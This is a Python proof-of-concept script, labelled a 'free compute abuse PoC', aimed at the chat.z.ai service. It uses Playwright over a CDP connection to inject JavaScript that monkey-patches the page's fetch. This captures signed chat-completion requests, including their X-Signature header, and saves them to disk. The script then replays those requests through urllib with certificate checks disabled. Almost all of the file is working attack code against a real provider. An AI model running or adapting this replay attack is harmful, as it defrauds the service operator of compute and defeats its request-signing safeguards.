"""Free compute abuse PoC - monkey-patch fetch via CDP, capture signed request, replay via urllib"""

import asyncio, json, os, uuid
from playwright.async_api import async_playwright
import urllib.request, ssl

OUT = r"C:\AISecurity\sentinel-community\strike\glm5_freecompute"
os.makedirs(OUT, exist_ok=True)

PROMPTS = [
    "Write a Python function that calculates the fibonacci sequence up to n terms using dynamic programming. Include time complexity analysis.",
    "Explain quantum computing in 500 words. Cover qubits, superposition, entanglement, and practical applications.",
    "Write a complete REST API in Go with endpoints for CRUD operations on a user resource. Include error handling and middleware.",
]

INTERCEPT_JS = """() => {
    window.__captured_requests = [];
    const origFetch = window.fetch;
    window.fetch = async function(...args) {
        const [url, opts] = args;
        if (typeof url === 'string' && url.includes('/api/v2/chat/completions')) {
            window.__captured_requests.push({
                url: url,
                method: opts?.method || 'GET',
                headers: Object.fromEntries(new Headers(opts?.headers || {}).entries()),
                body: opts?.body,
                timestamp: Date.now()
            });
        }
        return origFetch.apply(this, args);
    };
}"""


async def monkey_patch_and_send(page, prompt, idx):
    """Monkey-patch fetch, send prompt via UI, capture the signed request and replay it"""
    await page.evaluate(INTERCEPT_JS)

    ta = page.locator("textarea#chat-input")
    if not await ta.is_visible(timeout=5000):
        ta = page.locator("textarea").first
    await ta.click(force=True)
    await asyncio.sleep(0.3)
    await ta.fill(prompt)
    await asyncio.sleep(0.3)
    await page.keyboard.press("Enter")
    print(f"  [{idx + 1}] Sent via UI, waiting for capture...", flush=True)

    await asyncio.sleep(4)

    captured = await page.evaluate("() => JSON.stringify(window.__captured_requests)")
    reqs = json.loads(captured)

    if not reqs:
        print(f"  [{idx + 1}] No request captured!", flush=True)
        return {"prompt": prompt, "error": "no capture", "success": False}

    req = reqs[-1]
    sig = req["headers"].get("x-signature", "?")
    print(f"  [{idx + 1}] Captured! X-Signature={sig[:24]}...", flush=True)

    with open(
        os.path.join(OUT, f"captured_{idx + 1}.json"), "w", encoding="utf-8"
    ) as f:
        json.dump(req, f, indent=2, ensure_ascii=False)

    # Replay via Python urllib
    ctx = ssl._create_unverified_context()
    body_bytes = (
        req["body"].encode("utf-8") if isinstance(req["body"], str) else req["body"]
    )
    url = req["url"]
    if url.startswith("/"):
        url = "https://chat.z.ai" + url
    replay_req = urllib.request.Request(url, data=body_bytes, method="POST")
    for k, v in req["headers"].items():
        replay_req.add_header(k, v)

    try:
        resp = urllib.request.urlopen(replay_req, context=ctx, timeout=60)
        resp_data = resp.read()
        print(
            f"  [{idx + 1}] REPLAY SUCCESS: HTTP {resp.status}, {len(resp_data)} bytes",
            flush=True,
        )

        with open(
            os.path.join(OUT, f"replay_{idx + 1}.txt"), "w", encoding="utf-8"
        ) as f:
            f.write(
                f"PROMPT: {prompt}\nREPLAY STATUS: {resp.status}\nSIZE: {len(resp_data)} bytes\n{'=' * 50}\n"
            )
            f.write(resp_data.decode("utf-8", errors="replace"))

        return {
            "prompt": prompt,
            "status": resp.status,
            "size": len(resp_data),
            "success": True,
        }
    except Exception as e:
        print(f"  [{idx + 1}] REPLAY FAIL: {str(e)[:120]}", flush=True)
        return {"prompt": prompt, "error": str(e)[:200], "success": False}


async def main():
    async with async_playwright() as p:
        print("Connecting CDP...", flush=True)
        browser = await p.chromium.connect_over_cdp("http://localhost:9222")
        ctx = browser.contexts[0]
        page = ctx.pages[0] if ctx.pages else await ctx.new_page()
        page.on("dialog", lambda d: asyncio.ensure_future(d.accept()))

        results = []
        for idx, prompt in enumerate(PROMPTS):
            await page.goto(
                "https://chat.z.ai/", wait_until="domcontentloaded", timeout=20000
            )
            await asyncio.sleep(3)
            for _ in range(3):
                try:
                    await page.keyboard.press("Escape")
                    await asyncio.sleep(0.3)
                except:
                    pass
            try:
                await page.wait_for_selector("textarea", state="visible", timeout=10000)
            except:
                pass

            r = await monkey_patch_and_send(page, prompt, idx)
            results.append(r)
            await asyncio.sleep(2)

        with open(
            os.path.join(OUT, "freecompute_summary.json"), "w", encoding="utf-8"
        ) as f:
            json.dump(results, f, indent=2, ensure_ascii=False)

        success = sum(1 for r in results if r.get("success"))
        total_bytes = sum(r.get("size", 0) for r in results if r.get("success"))
        print(
            f"\nFree compute PoC: {success}/{len(PROMPTS)} replays OK, {total_bytes} total bytes",
            flush=True,
        )


if __name__ == "__main__":
    asyncio.run(main())
